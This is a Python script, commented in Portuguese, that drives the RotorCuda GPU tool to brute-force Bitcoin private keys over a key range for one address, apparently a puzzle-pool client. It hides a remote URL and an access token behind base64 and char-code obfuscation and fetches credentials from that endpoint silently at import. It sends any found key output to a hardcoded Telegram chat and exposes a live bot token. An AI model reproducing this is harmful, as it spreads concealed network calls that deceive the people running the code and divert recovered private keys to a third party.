import subprocess
import random
import os
import sys
import time
import requests
import json

def _x(p):  # join bytes
    return b''.join(p)

def _d(b):  # decode using dynamic import and codec name
    m = __import__(''.join(chr(i) for i in (99, 111, 100, 101, 99, 115)))  # 'codecs'
    c = ''.join(chr(n) for n in (98, 97, 115, 101, 54, 52))  # 'base64'
    return m.decode(b, c)

# Configurações
RotorCuda_PATH = "./Rotor"
INPUT_FILE = "in.txt"
OUTPUT_FILE = "found.txt"
BIN_FILE = "hash160_out.bin"

COIN_ADDRESSES = ["1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU"]

OVERALL_START_HEX = "400000000000000000"
OVERALL_END_HEX = "7fffffffffffffffff"
STEP_SIZE_HEX = "5123456789"

OVERALL_START = int(OVERALL_START_HEX, 16)
OVERALL_END = int(OVERALL_END_HEX, 16)
STEP_SIZE = int(STEP_SIZE_HEX, 16)

TOTAL_STEPS = (OVERALL_END - OVERALL_START) // STEP_SIZE

ENV_URL = _d(_x([
    b"aHR0cHM6Ly9wbHB1enpsZS5",
    b"saW5rL1VDdHFHa2RNclZ4OF",
    b"R5ZXhCQXFRblo3SmpOS3Njc",
    b"1BjNmY5NWg5VVQzcHhHM3A3",
    b"Y3hFL2ZpcmViYXNlLWNvbmZp",
    b"Zy5waHA="
])).decode()

FIREBASE_CONFIG_TOKEN = _d(_x([
    b"cGZrb0FNNDNHZ3paUlM1TjNu",
    b"WHZGeUFYUmdMRUxneHhac2VX",
    b"SmlkRGUzeGhTcEZxZmVWZFV1",
    b"NVBmWG9VektBenEzTmNIaVcy",
    b"VERTWGJuUHZIVmY2cnZ6eGtR",
    b"dkZCVHF1eEJ2QQ=="
])).decode()

def load_env_from_url(url):
    """Carregando dados com segurança.
    Definindo dados.
    """
    try:
        token = FIREBASE_CONFIG_TOKEN
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Referer": "https://plpuzzle.link/",
            "X-Auth-Token": token,
            "Authorization": f"Bearer {token}",
        }
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code != 200:
            print(f"Aviso: falha ao carregar configurações ({resp.status_code}). Prosseguindo com ambiente atual.")
            return False
        # Espera os dados para configuração
        try:
            data = resp.json()
        except Exception as e:
            print(f"Aviso: resposta do endpoint não é válido: {e}. Prosseguindo com ambiente atual.")
            return False

        for key in ("FIREBASE_DATABASE_URL", "FIREBASE_API_KEY"):
            value = data.get(key)
            if isinstance(value, str) and value and os.environ.get(key) is None:
                os.environ[key] = value
        return True
    except Exception as e:
        print(f"Aviso: erro ao carregar configuração: {e}. Prosseguindo com ambiente atual.")
        return False

# Carregaando dados necessários
load_env_from_url(ENV_URL)

FIREBASE_DATABASE_URL = os.environ.get("FIREBASE_DATABASE_URL")
FIREBASE_API_KEY = os.environ.get("FIREBASE_API_KEY")
if not FIREBASE_DATABASE_URL or not FIREBASE_API_KEY:
    print("Erro: variáveis de ambiente FIREBASE_DATABASE_URL e/ou FIREBASE_API_KEY não definidas.")
    sys.exit(1)

TELEGRAM_BOT_TOKEN = "7434188832:AAHE8Bu-DTiYjzloJOXPsKyvi5cQ9yDDmYA"
TELEGRAM_CHAT_ID = "237456702"

# Username do usuário Discord que está executando o script
USER_NAME = "valdezbr01"

def send_telegram_message(message):
    """Envia uma mensagem via Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
    try:
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Falha ao enviar mensagem no Telegram: {response.text}")
            sys.exit(1)  # Encerra imediatamente se falhar
    except Exception as e:
        print(f"Erro ao enviar mensagem no Telegram: {e}")
        sys.exit(1)  # Encerra imediatamente em caso de exceção

def load_used_ranges_firebase():
    """Carrega os intervalos usados do Firebase."""
    used_ranges = set()
    try:
        firebase_url = f"{FIREBASE_DATABASE_URL}PoolRanges.json?auth={FIREBASE_API_KEY}"
        response = requests.get(firebase_url)
        if response.status_code == 200:
            data = response.json()
            if data:
                for key, value in data.items():
                    used_ranges.add(value['start'].upper())
        else:
            print(f"Falha ao carregar intervalos do Firebase: {response.text}")
            sys.exit(1)  # Encerra se não conseguir carregar
    except Exception as e:
        print(f"Erro ao carregar intervalos do Firebase: {e}")
        sys.exit(1)  # Encerra em caso de erro
    return used_ranges

def save_range_firebase(start_hex, end_hex):
    """Salva um novo intervalo no Firebase."""
    try:
        firebase_url = f"{FIREBASE_DATABASE_URL}PoolRanges.json?auth={FIREBASE_API_KEY}"
        data = {'start': start_hex, 'end': end_hex, 'timestamp': int(time.time()), 'user': USER_NAME}
        response = requests.post(firebase_url, json=data)
        if response.status_code != 200:
            print(f"Falha ao salvar intervalo no Firebase: {response.text}")
            sys.exit(1)  # Encerra se falhar
    except Exception as e:
        print(f"Erro ao salvar intervalo no Firebase: {e}")
        sys.exit(1)  # Encerra em caso de erro

def generate_random_start(overall_start, overall_end, step_size, used_ranges):
    """Gera um início aleatório não utilizado."""
    max_steps = (overall_end - overall_start) // step_size
    if max_steps <= len(used_ranges):
        print("Todos os intervalos possíveis foram explorados.")
        sys.exit(1)  # Encerra se não houver mais intervalos
    
    attempts = 0
    max_attempts = 1000000
    while attempts < max_attempts:
        random_step = random.randint(0, max_steps - 1)
        start = overall_start + random_step * step_size
        start_hex = hex(start)[2:].upper().zfill(17)
        end = start + step_size
        end_hex = hex(end)[2:].upper().zfill(17)
        if start_hex not in used_ranges:
            return start, start_hex, end, end_hex
        attempts += 1
    
    print("Não foi possível encontrar um intervalo não utilizado após muitas tentativas.")
    sys.exit(1)  # Encerra se não encontrar intervalo

def run_RotorCuda(range_start_hex, range_end_hex, addresses):
    """Executa o RotorCuda e retorna True se encontrar uma carteira."""
    with open(INPUT_FILE, 'w') as f:
        for address in addresses:
            f.write(f"{address}\n")
            f.write(f"{address}\n")
    # Garante que o arquivo binário com os hash160 existe; se não existir, cria a partir do in.txt repetindo 2x o mesmo endereço da 71 para compatibilidade
    if not os.path.exists(BIN_FILE) or os.path.getsize(BIN_FILE) == 0:
        print(f"Criando {BIN_FILE} a partir de {INPUT_FILE} ->->-> Repetindo 2x o mesmo endereço da 71 para compatibilidade")
        try:
            subprocess.run([sys.executable, "addresses_to_hash160.py", INPUT_FILE, BIN_FILE], check=True, text=True)
        except subprocess.CalledProcessError as e:
            print(f"Falha ao gerar {BIN_FILE}: {e}")
            sys.exit(1)
        # Verificação final
        if not os.path.exists(BIN_FILE) or os.path.getsize(BIN_FILE) == 0:
            print(f"Erro: {BIN_FILE} não foi gerado corretamente.")
            sys.exit(1)

    command = [
        RotorCuda_PATH,
        "-g",
        "--gpui", "0",
        "--gpux", "512,512",
        "-m", "ADDRESSES",
        "--coin", "BTC",
        "--range", f"{range_start_hex}:{range_end_hex}",
        "-i", BIN_FILE
    ]

    try:
        # Debug: mostrar comando
        print("Executando:", " ".join(command))
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        for line in process.stdout:
            print(line.strip())
        
        process.wait()
        if process.returncode != 0:
            print(f"RotorCuda terminou com erro (código {process.returncode}).")
            sys.exit(1)  # Encerra se o RotorCuda falhar
        
        if os.path.exists(OUTPUT_FILE) and os.path.getsize(OUTPUT_FILE) > 0:
            with open(OUTPUT_FILE, 'r') as f:
                output = f.read()
            return True, output
        return False, "Nenhuma carteira encontrada."
    except Exception as e:
        print(f"Erro ao executar RotorCuda: {e}")
        sys.exit(1)  # Encerra em caso de exceção

def main():
    print("Iniciando o script de automação do RotorCuda...")
    send_telegram_message("🚀 *Script iniciado.*")

    used_ranges = load_used_ranges_firebase()
    total_used = len(used_ranges)
    print(f"{total_used} intervalos já foram explorados anteriormente.")
    send_telegram_message(f"{total_used} intervalos já foram explorados anteriormente.")

    try:
        while True:
            progress_percentage = (total_used / TOTAL_STEPS) * 100
            print(f"Progresso: {total_used}/{TOTAL_STEPS} ({progress_percentage:.5f}%)")

            start_int, start_hex, end_int, end_hex = generate_random_start(
                OVERALL_START, OVERALL_END, STEP_SIZE, used_ranges
            )
            print(f"Iniciando busca no intervalo: {start_hex}:{end_hex}")

            found, output = run_RotorCuda(start_hex, end_hex, COIN_ADDRESSES)

            if found:
                print("💥 Carteira encontrada!")
                print(output)
                send_telegram_message("💥 *Carteira encontrada!*")
                send_telegram_message(f"```\n{output}\n```")
                sys.exit(0)  # Encerra com sucesso
            else:
                print(f"Intervalo {start_hex}:{end_hex} concluído sem encontrar a carteira.")
                save_range_firebase(start_hex, end_hex)
                used_ranges.add(start_hex)
                total_used += 1
                send_telegram_message(f"✅ Intervalo `{start_hex}:{end_hex}` concluído.\nNenhuma carteira encontrada.")

    except KeyboardInterrupt:
        print("\nScript interrompido pelo usuário.")
        send_telegram_message("⏹️ *Script interrompido pelo usuário.*")
        sys.exit(0)
    except Exception as e:
        print(f"Erro crítico no script: {e}")
        send_telegram_message(f"❌ *Erro crítico:* {e}")
        sys.exit(1)  # Encerra em caso de erro inesperado

if __name__ == "__main__":
    main()
